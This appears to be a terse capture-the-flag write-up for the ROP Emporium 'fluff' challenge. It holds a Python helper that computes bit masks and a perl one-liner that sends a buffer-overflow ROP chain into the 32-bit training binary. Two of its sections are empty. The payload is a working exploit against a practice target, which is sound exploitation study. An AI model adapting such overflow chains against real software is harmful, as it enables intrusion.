# fluff
The challenge is available [here](https://ropemporium.com/challenge/fluff.html).

## Black-Box Test

## In-depth research

## Solution


```python
def get_mask(target, value):
    target_bits = bin(ord(target))[2:]
    value_bits  = bin(value)[2:]

    mask_bits   = ''

    while(target_bits):
        if target_bits[-1] == value_bits[-1]:
            mask_bits = '1' + mask_bits
            target_bits = target_bits[:-1]
        else:
            mask_bits = '0' + mask_bits

        value_bits = value_bits[:-1]

    while(value_bits):
        if value_bits[-1] == '0':
            mask_bits = '1' + mask_bits
        else:
            mask_bits = '0' + mask_bits
        value_bits = value_bits[:-1]

    mask = int(mask_bits, 2)
    return mask

for c in "flag.txt":
    print(hex(get_mask(c, 0xb0bababa)), c)
```

```
perl -e 'print "X"x44 . "\xbb\x85\x04\x08" . "\x4b\x4b\x45\x4f" . "\x43\x85\x04\x08" . "\x58\x85\x04\x08" . "\x08\x04\xa0\x18" . "\x55\x85\x04\x08" ."\xbb\x85\x04\x08" . "\xdd\x46\x45\x4f" . "\x43\x85\x04\x08" . "\x58\x85\x04\x08" . "\x08\x04\xa0\x19" . "\x55\x85\x04\x08". "\xd0\x83\x04\x08" . "XXXX" . "\x18\xa0\x04\x08"' | ./fluff32
```